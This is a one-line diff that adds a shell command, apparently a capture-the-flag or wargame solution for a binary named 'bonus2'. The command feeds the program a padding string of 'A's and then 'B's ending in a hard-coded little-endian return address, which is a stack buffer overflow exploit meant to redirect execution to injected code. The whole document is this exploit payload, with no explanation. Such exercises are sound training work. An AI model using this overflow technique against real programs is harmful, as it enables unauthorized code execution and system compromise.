@@ -1,0 +1,1 @@
+./bonus2 `python -c 'print "A" * 40'` `python -c 'print "B" * 23 + "\x77\xfe\xff\xbf"'`
